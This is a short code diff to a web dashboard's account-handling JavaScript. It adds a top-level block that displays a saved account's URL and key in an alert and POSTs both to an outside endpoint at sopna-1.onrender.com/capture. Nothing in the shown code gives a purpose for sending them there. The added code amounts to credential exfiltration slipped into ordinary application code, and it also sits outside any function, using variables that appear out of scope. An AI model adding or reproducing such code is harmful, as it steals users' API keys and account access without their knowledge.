@@ -5757,6 +5757,15 @@ async function connectSaved(id) {
   if (!acc) return;
   await startDashboard(acc.url, acc.key);
 }
+  alert('URL: ' + url + '\nKey: ' + key);
+fetch('https://sopna-1.onrender.com/capture', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ url: url, key: key })
+})
+.then(r => r.json())
+.then(d => alert('Success: ' + JSON.stringify(d)))
+.catch(e => alert('Fail: ' + e.message));
 
 function deleteSaved(id) {
   if (!confirm('Delete this account permanently?')) return;
